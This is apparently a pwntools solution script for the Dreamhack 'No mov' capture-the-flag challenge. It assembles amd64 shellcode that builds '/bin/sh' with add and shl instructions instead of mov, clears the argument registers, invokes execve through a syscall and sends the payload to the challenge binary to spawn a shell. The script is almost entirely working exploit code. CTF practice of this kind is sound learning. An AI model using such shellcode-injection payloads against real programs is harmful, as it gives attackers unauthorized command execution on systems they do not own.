from pwn import *

# port = 17554
# rem = remote("host3.dreamhack.games", port)
rem = process("./Pwnable/No mov/problem/deploy/main")

context.arch = 'amd64'

binsh_str = u64(b'/bin/sh\x00')
print(hex(binsh_str))

# pause()

shell = f"""    
    add rax, {(binsh_str >> 32) & 0xFFFFFFFF}
    shl rax, 32
    add rax, {binsh_str & 0xFFFFFFFF}
    push rax
    pop rdi
    
    xor rsi, rsi
    xor rdx, rdx
    
    /* call execve() */
    xor rax, rax
    add rax, 0x3b
    syscall
    
"""

print(asm(shell))

rem.sendafter(b'> ', asm(shell))

print(rem.recvall())